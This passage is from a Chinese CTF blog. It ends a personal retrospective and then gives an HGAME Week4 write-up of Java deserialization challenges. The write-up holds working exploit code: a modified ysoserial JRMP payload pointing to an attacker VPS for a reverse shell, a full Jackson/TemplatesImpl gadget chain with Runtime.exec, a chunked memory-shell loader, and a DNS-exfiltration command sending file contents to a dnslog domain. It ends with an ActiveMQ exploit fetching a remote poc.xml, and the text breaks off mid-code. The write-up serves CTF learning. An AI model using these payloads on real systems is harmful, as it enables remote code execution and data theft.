title="Boogipop大佬"></a>Boogipop大佬</h3><p>打了VNCTF嘛，那肯定有我pop大佬出题啊，再加上有一道givenphp，考点是LD_PRELOAD</p><p>但是很奇怪一直打不通，于是赛后便去询问，说是服务器靶机的问题</p><p>并且前面2月初的时候</p><p><img src="/../images/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/image-20240226064949449.png" alt="image-20240226064949449"></p><p><img src="/../images/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/image-20240226064812410.png" alt="image-20240226064812410"></p><p>突然发现Boogipop大佬的友链中混进了这个不入流的东西</p><p>哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈</p><p>于是趁着问问题的机会，加上了Boogipop大佬的好友</p><p>但可惜没有交流，希望我有问题还是能向大佬请教</p><p>但问题就是不知道什么该问什么不该问（唉</p><h3 id="drunkbaby师傅"><a href="#drunkbaby师傅" class="headerlink" title="drunkbaby师傅"></a>drunkbaby师傅</h3><p>跟知道Boogipop大佬的时间差不多，很厉害的师傅</p><p>入门java就是根据drunkbaby师傅的项目，并且面试nepnep时提到这个</p><p>于是是drunkbaby师傅来面试我的java</p><p>然后nepnep面试结束时baby师傅说无论此次的结果，以后java有问题可以找他</p><p>面试失败换来baby师傅好友，还好吧</p><p>但还是那个问题——不知道什么该问什么不该问</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>感觉还是要有实力，不然都不好意思去认识其他师傅（难怪FallW1nd这么强</p><p>现在虽然还是菜，但基础的话也还行吧，多加一些web佬认识一下</p><p>多向他们学习</p><h2 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h2><p>这个东西在大一下一次聚会时，向师兄请教过</p><p>当时他问我第一句话就是有没有逃课，当时其实挺懵的</p><p>但经历了大一下一整个学期的浑浑噩噩，以及见到优秀的师兄后</p><p>我开始体悟到，逃课其实是为了更加专注，专注于什么就靠个人选择</p><p>想打比赛有成绩，想毕业就工作，那就专注学网安知识，提升技术</p><p>想要读研，那便专注于学业，工作室中就有北大的师兄</p><p>所以说工作室中都是优秀的师兄（不管是什么方面</p><p>所以更关键的是自己想要干嘛</p><p>于是大二上开始决定翘课，有了更多的时间去学习感到充实（虽然效率可能没有很高</p><p>但与此同时来的就是会扣平时分，怕期末挂科</p><p>万一遇上那些牛魔老师就更惨了</p><p>单就期末考试来说，你准备了一个学期和临时冲刺都是为了及格而已（想拿奖学金除外</p><p>花了大量时间去记只是为了期末考试及格，没有时间去学习其他东西</p><p>所以我选择翘课，但是期末徘徊在挂科边缘确实恐怖</p><p>又是新的学期，希望一切安好</p><p>。。。。。开学第一天就受鸟气</p><h2 id="每篇一言"><a href="#每篇一言" class="headerlink" title="每篇一言"></a>每篇一言</h2><p>我想推开的却成为了我的，而我去拼命争取、想要得到的最后却成了别人的，我们其实有时候没必要太在意失去了什么又获得了什么，一味的在意某一样东西的失去和获取，他只会成为你的一道枷锁并不会让你开心快乐，顺其自然，只管往前走，不要回头，该来的总会来该走的总会走，爱意随风起，你要知道你感受到的是风并不是抓住了风</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>迄今所有人生都大写着失败，但并不妨碍我继续向前</p><p>如果你有耐心看到这里，谢谢你愿意花时间了解我的故事</p><p>奖励一个蛇姐</p><p><img src="/../images/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/image-20240226210749923.png" alt="image-20240226210749923"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-week4</title>
    <link href="/2024/02/24/HGAME-week4/"/>
    <url>/2024/02/24/HGAME-week4/</url>
    
    <content type="html"><![CDATA[<h1 id="HGAME-Week4"><a href="#HGAME-Week4" class="headerlink" title="HGAME-Week4"></a>HGAME-Week4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web 4&#x2F;6 还可以，不错，但另一道题看那么多人解出来，是不是很简单啊？</p><p><img src="/../images/HGAME-week4/image-20240228213658720.png" alt="image-20240228213658720"></p><h2 id="i-short-you-1（三血"><a href="#i-short-you-1（三血" class="headerlink" title="i-short-you-1（三血"></a><strong>i-short-you-1</strong>（三血</h2><p>提示：JRMP</p><p>网上搜jrmp反序列化，找到文章，其实看不懂，但看到这个</p><p><img src="/../images/HGAME-week4/image-20240225184346033.png" alt="image-20240225184346033"></p><p>我就知道就是这里了</p><p>这里我们使用exploit&#x2F;JRMPListener+payloads&#x2F;JRMPClient（服务端打客户端类型）</p><p>受害机反序列化该payload时会向指定的攻击机ip+端口发起RMI通信，在通信阶段攻击机会将第二次反序列化的payload（如CommonCollections1）发送给受害机</p><p>于是我们要修改yso的代码</p><p>把payloads&#x2F;JRMPClient的代码改出来，写为我们的ip</p><div class="code-wrapper"><pre><code class="hljs reasonml">String command = <span class="hljs-string">&quot;vps:1099&quot;</span>;String host;<span class="hljs-built_in">int</span> port;<span class="hljs-built_in">int</span> sep = command.index<span class="hljs-constructor">Of(&#x27;:&#x27;)</span>;<span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;    port = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Random()</span>.next<span class="hljs-constructor">Int(65535)</span>;    host = command;&#125;<span class="hljs-keyword">else</span> &#123;    host = command.substring(<span class="hljs-number">0</span>, sep);    port = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Integer</span>.</span></span>value<span class="hljs-constructor">Of(<span class="hljs-params">command</span>.<span class="hljs-params">substring</span>(<span class="hljs-params">sep</span> + 1)</span>);&#125;ObjID id = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjID(0)</span>; <span class="hljs-comment">// RMI registry</span>TCPEndpoint te = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TCPEndpoint(<span class="hljs-params">host</span>, <span class="hljs-params">port</span>)</span>;UnicastRef <span class="hljs-built_in">ref</span> = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UnicastRef(<span class="hljs-params">new</span> LiveRef(<span class="hljs-params">id</span>, <span class="hljs-params">te</span>, <span class="hljs-params">false</span>)</span>);RemoteObjectInvocationHandler obj = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RemoteObjectInvocationHandler(<span class="hljs-params">ref</span>)</span>;ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos</span>)</span>;oos.write<span class="hljs-constructor">Object(<span class="hljs-params">obj</span>)</span>;oos.close<span class="hljs-literal">()</span>;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>));</code></pre></div><p>原来的代码中用到了动态代理，但是太长了，于是删掉</p><p>这里很巧的是我的vps的ip正好220，unknown师傅的vps的ip就超了（哈哈</p><p>比较难的是改<code>exploit/JRMPListener</code></p><p>这里我们直接找writeObject的地方</p><p><img src="/../images/HGAME-week4/image-20240225185548705.png" alt="image-20240225185548705"></p><p>我们找一下payload是什么</p><p><img src="/../images/HGAME-week4/image-20240225185649553.png" alt="image-20240225185649553"></p><p>会发现是工具中要传入的参数</p><p>这里我们直接把它改为new Object</p><p>然后BadAttri…那里改为我们jackson的链子即可</p><p><img src="/../images/HGAME-week4/image-20240225185838292.png" alt="image-20240225185838292"></p><p><img src="/../images/HGAME-week4/image-20240225185937116.png" alt="image-20240225185937116"></p><p>但这里准备好后就有一个问题，如何部署环境</p><p>即使把他的class文件上传上去后执行，也会有找不到包的错误</p><p>这里问了下unknown师傅，他提供了一个方法，端口转发（这就是计网吗，太强了</p><p>利用frp把vps上的某端口的流量转到本地的端口</p><p>公网的跑frps</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span></code></pre></div><p>本地跑frpc</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><span class="hljs-attr">server_addr</span> = vps_ip<span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><span class="hljs-section">[JRMP]</span><span class="hljs-attr">type</span> = tcp<span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">local_port</span> = <span class="hljs-number">1099</span><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1099</span></code></pre></div><p>然后启动<code>exploit/JRMPListener</code></p><p>接着把<code>payloads/JRMPClient</code>生成的base64传入题目</p><p>这样即可反弹shell</p><p><img src="/../images/HGAME-week4/image-20240224181313494.png" alt="image-20240224181313494"></p><h2 id="i-short-you-2（一血"><a href="#i-short-you-2（一血" class="headerlink" title="i-short-you-2（一血"></a><strong>i-short-you-2</strong>（一血</h2><p>不出网，限制长度</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-built_in">String</span> payload</span>) &#123;    <span class="hljs-comment">// real long</span>    <span class="hljs-keyword">if</span> (payload.<span class="hljs-title function_">length</span>() &gt; <span class="hljs-number">3333</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;    &#125;    byte[] bytes = <span class="hljs-title class_">Base64</span>.<span class="hljs-title function_">getDecoder</span>().<span class="hljs-title function_">decode</span>(payload);    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes)).<span class="hljs-title function_">readObject</span>();    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;        e.<span class="hljs-title function_">printStackTrace</span>();        <span class="hljs-keyword">return</span> e;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;&#125;</code></pre></div><p>附件连依赖都没有，只有springboot，那就只能打jackson</p><p>正好最近收集了回显小马</p><p>但是jackson链子是不稳定的（不稳定不代表不会成功</p><p>加上稳定的代码后又会超出长度，没办法了</p><h3 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h3><p>只能刷机爆破了（幸好靶机关了能直接开，嘻嘻</p><p>正常会有报错栈（这里是成功执行的情况</p><p><img src="/../images/HGAME-week4/image-20240222234149790.png" alt="image-20240222234149790"></p><p>经不同小马的尝试</p><p>打入我的小马</p><p><img src="/../images/HGAME-week4/image-20240223052634551.png" alt="image-20240223052634551"></p><p><img src="/../images/HGAME-week4/image-20240223054719495.png" alt="image-20240223054719495"></p><h3 id="非预期-（-也要刷机"><a href="#非预期-（-也要刷机" class="headerlink" title="非预期 （ 也要刷机"></a>非预期 （ 也要刷机</h3><p>不出网，但出DNS，这种情况最近遇到的真多（出题人说是节点网络配置问题，他懒得整</p><p>于是他换了flag的名称，防止非预期，但还是被unknown师傅非预期了</p><p>同样jackson的链子，但他的马不是回显，而是执行</p><p><img src="/../images/HGAME-week4/image-20240224135447565.png" alt="image-20240224135447565"></p><p>接下来更细节</p><div class="code-wrapper"><pre><code class="hljs routeros">ping <span class="hljs-string">&quot;<span class="hljs-variable">$(cat /* 2&gt;/dev/null |cut -c 1-20 | xxd -p)</span>.my386n.dnslog.cn&quot;</span><span class="hljs-built_in"></span><span class="hljs-built_in">ping </span><span class="hljs-string">&quot;<span class="hljs-variable">$(cat /* 2&gt;/dev/null |cut -c 21-50 | xxd -p)</span>.my386n.dnslog.cn&quot;</span></code></pre></div><p>因为ping dns长度有限制</p><p>所以先回显前面20字符，再回显后面的字符</p><p>xxd -p是转换成16进制</p><p>因为花括号不是域名的字符，可能会失败</p><p><code>cat /* 2&gt;/dev/null</code>这是我没想到的</p><p>因为<code>/</code>有目录，<code>2&gt;/dev/null</code>能不进行报错，就只输出文件内容</p><p>我刚开始的做法也是是命令执行且有回显，但是结果只有一行，列目录看不到flag文件名称，我也试过<code>cat /*</code>也没结果</p><p>现在看来<code>cat /* 2&gt;/dev/null</code>应该就能解决问题</p><p>并且unknown师傅提示我只有一行的话目录可以base64编码一下（woc，太强了</p><h3 id="分块传送-（缩短payload的方法，用在这里不合适，毕竟要刷机"><a href="#分块传送-（缩短payload的方法，用在这里不合适，毕竟要刷机" class="headerlink" title="分块传送 （缩短payload的方法，用在这里不合适，毕竟要刷机"></a>分块传送 （缩短payload的方法，用在这里不合适，毕竟要刷机</h3><p>在网上找如何缩短payload的文章中，发现有分块传输的方法</p><p>本来不想试的，但unknown师傅成功了，我也就跟着他尝试，这就叫前人栽树后人乘凉吗（嘻嘻</p><p>不过挺佩服unknown师傅，中间有几个文章中的bug，我遇到了不会弄，但他弄出来了</p><p>分块传输的思路就是使用<code>FileOutputStream</code>写入内存马的文件，然后使用<code>URLClassLoader</code>进行加载</p><p>当然为了使payload尽可能小，所以这些操作还是放在javassist生成的类的空参构造函数中</p><div class="code-wrapper"><pre><code class="hljs awk">    public static byte[] payload2() throws NotFoundException, CannotCompileException, IOException &#123;<span class="hljs-regexp">//</span>        String s=<span class="hljs-string">&quot;    public A()&#123;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        try &#123;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            String path = \&quot;/tmp/a\&quot;;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            java.io.File file = new java.io.File(path);\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            java.io.FileOutputStream fos = new java.io.FileOutputStream(path, true);\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            String data = \&quot;把内存马的class文件base64加密后分开进行传输\&quot;;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            fos.write(data.getBytes());\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            fos.close();\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &#125; catch (Exception ignore) &#123;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &#125;&quot;</span>;<span class="hljs-regexp">//</span>        String s = <span class="hljs-string">&quot;    public A()&#123;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        try &#123;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            String path=\&quot;/tmp/a\&quot;;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            java.io.FileInputStream fis = new java.io.FileInputStream(path);\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            byte[] data = new byte[fis.available()];\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            fis.read(data);\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            java.io.FileOutputStream fos = new java.io.FileOutputStream(\&quot;/tmp/InjectToController.class\&quot;);\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            fos.write(java.util.Base64.getDecoder().decode(data));\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            fos.close();\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &#125; catch(Exception ignored)&#123;&#125;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &#125;&quot;</span>;        String s = <span class="hljs-string">&quot;    public A()&#123;\n&quot;</span> +                <span class="hljs-string">&quot;        try &#123;\n&quot;</span> +                <span class="hljs-string">&quot;            String path = \&quot;file://tmp/\&quot;;\n&quot;</span> +                <span class="hljs-string">&quot;            java.net.URL url = new java.net.URL(path);\n&quot;</span> +                <span class="hljs-string">&quot;            java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;url&#125;,Thread.currentThread().getContextClassLoader());\n&quot;</span> +                <span class="hljs-string">&quot;            Class clazz = urlClassLoader.loadClass(\&quot;InjectToController\&quot;);\n&quot;</span> +                <span class="hljs-string">&quot;            clazz.newInstance();\n&quot;</span> +                <span class="hljs-string">&quot;        &#125; catch (Exception ignored) &#123;\n&quot;</span> +                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +                <span class="hljs-string">&quot;    &#125;&quot;</span>;        ClassPool classPool = ClassPool.getDefault();        CtClass ctClass = classPool.get(AbstractTranslet.class.getName());        CtClass calc = classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);        calc.setSuperclass(ctClass);        CtConstructor ctConstructor = CtNewConstructor.make(s, calc);        calc.addConstructor(ctConstructor);        return calc.toBytecode();    &#125;</code></pre></div><h4 id="网上没有的几个细节-！！！！！"><a href="#网上没有的几个细节-！！！！！" class="headerlink" title="网上没有的几个细节   ！！！！！"></a>网上没有的几个细节   ！！！！！</h4><ol><li>内存马的文件不能在包下面，比如我的内存马就是<code>package jackson;</code>,在后面URLClassLoader加载时就会报错，<code>java.lang.NoClassDefFoundError: InjectToController (wrong name: jackson/InjectToController)</code></li><li>base64全部写入后再解密（怕有萌新弄乱，用字节码写入的就不用base64解密了</li><li>URLClassLoader加载时，要加上<code>Thread.currentThread().getContextClassLoader()</code>，否则在加载时会出现找不到类的报错<code>ClassNotFound: javax.servlet.Filter</code> ！！！！！</li><li>你内存马原来是什么名字，写入到环境中也要是什么名字，比如我的内存马叫<code>InjectToController</code>，在写入后也要叫这个名字，给为其他名字是加载不了的</li></ol><p>根据题目限制的长度，对应修改每次写入的base64长度即可</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>上面的方法由于不稳定肯定都是要刷机的，所以还是等预期解</p><p>jackson稳定后再进行压缩</p><p>真不会啊，等WP</p><p>太强了，不仅缩短了jackson稳定的代码，还用了一个非常小的马</p><p>WOC，神了</p><div class="code-wrapper"><pre><code class="hljs reasonml">import com.alibaba.fastjson.JSONArray;import com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.*;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.aop.target.HotSwappableTargetSource;import org.springframework.http.HttpEntity;import org.springframework.http.HttpHeaders;import org.springframework.http.ResponseEntity;import org.springframework.web.client.RestTemplate;import javax.management.BadAttributeValueExpException;import javax.swing.event.EventListenerList;import javax.swing.event.SwingPropertyChangeSupport;import javax.swing.text.StyledEditorKit;import javax.swing.undo.UndoManager;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.net.URI;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.sql.SQLOutput;import java.util.Base64;import java.util.HashMap;import java.util.Scanner;import java.util.Vector;public <span class="hljs-keyword">class</span> XString_chain &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        byte<span class="hljs-literal">[]</span> bytecodes = payload3<span class="hljs-literal">()</span>;        Templates templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">null</span>)</span>;        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;        advisedSupport.set<span class="hljs-constructor">TargetSource(<span class="hljs-params">new</span> HotSwappableTargetSource(<span class="hljs-params">templatesimpl</span>)</span>);        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">handler</span>,<span class="hljs-string">&quot;proxiedInterfaces&quot;</span>,<span class="hljs-params">null</span>)</span>;        Templates proxyObj = (Templates)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Templates</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;        HotSwappableTargetSource h1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">jsonNodes</span>)</span>;        HotSwappableTargetSource h2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">new</span> XString(<span class="hljs-params">null</span>)</span>);        HashMap&lt;Object, Object&gt; objectObjectHashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">h1</span>, <span class="hljs-params">h2</span>)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(serial(objectObjectHashMap).length<span class="hljs-literal">()</span>);    &#125;    public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 ) throws Exception &#123;        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;        &#125;        catch ( ClassNotFoundException e ) &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;        return s;    &#125;    public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">name</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;    public static byte<span class="hljs-literal">[]</span> payload3<span class="hljs-literal">()</span> throws CannotCompileException, NotFoundException, IOException &#123;        ClassPool classPool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        CtClass ctClass = classPool.make<span class="hljs-constructor">Class(<span class="hljs-string">&quot;a&quot;</span>)</span>;        CtClass superClass = classPool.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractTranslet</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>);        ctClass.set<span class="hljs-constructor">Superclass(<span class="hljs-params">superClass</span>)</span>;        CtConstructor constructor = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CtConstructor(<span class="hljs-params">new</span> CtClass[]&#123;&#125;, <span class="hljs-params">ctClass</span>)</span>;        constructor.set<span class="hljs-constructor">Body(<span class="hljs-string">&quot;throw new Exception(new java.util.Scanner(Runtime.getRuntime().exec(\&quot;执行的命令\&quot;).getInputStream()).next());&quot;</span>)</span>;        ctClass.add<span class="hljs-constructor">Constructor(<span class="hljs-params">constructor</span>)</span>;        return ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>;    &#125;&#125;</code></pre></div><p>官方WP的<code>setValue(templatesimpl,&quot;_name&quot;,&quot;1ue&quot;);</code>还可以改为一个字符</p><p>不过大差不差了</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>这个马没得说，太强了</p><p>我都忘记这个稳定代码是怎么分析出来的了（早知道当时重新看一下了</p><p>为什么就不说了，说说如何缩短</p><p><img src="/../images/HGAME-week4/image-20240301182459369.png" alt="image-20240301182459369"></p><p>这个类似于网上的缩短Rome链，这里我们只需要<code>this.advised</code>，所以直接把不相关的属性<code>proxiedInterfaces</code>设置为null</p><p><img src="/../images/HGAME-week4/image-20240301182743074.png" alt="image-20240301182743074"></p><p>然后可以看到<code>setTarget</code>还调用了两个函数实际上就是为了返回target</p><p>我们可以直接调用<code>setTargetSource</code>然后传入一个<code>TargetSource</code>类型的对象即可</p><p>这里我们用到<code>HotSwappableTargetSource</code></p><p><img src="/../images/HGAME-week4/image-20240301183344557.png" alt="image-20240301183344557"></p><p>可以看到几乎和<code>SingletonTargetSource</code>一样</p><p>就这两处了</p><p>其次jackson链子之中，用预期解的<code>HotSwappableTargetSource</code>和<code>XString</code>这条链是最短的</p><p>我用的也是这个</p><h2 id="Reverse-and-Escalation"><a href="#Reverse-and-Escalation" class="headerlink" title="Reverse and Escalation."></a><strong>Reverse and Escalation.</strong></h2><p>开题目发现两个环境，有点诧异</p><p>有一个要登录，尝试admin&#x2F;admin</p><p>成功后发现是ActiveMQ，版本为5.17.3</p><p>正好前段时间收集了payload</p><p>一把梭哈</p><div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;DataOutput dataOutput = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;dataOutput.write<span class="hljs-constructor">Int(0)</span>;dataOutput.write<span class="hljs-constructor">Byte(31)</span>;dataOutput.write<span class="hljs-constructor">Int(1)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">Int(1)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;http://vps_ip:8000/poc.xml&quot;</span>)</span>; <span class="hljs-comment">//开放端口请求文件</span>Socket socket = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Socket(<span class="hljs-string">&quot;139.224.232.162&quot;</span>, 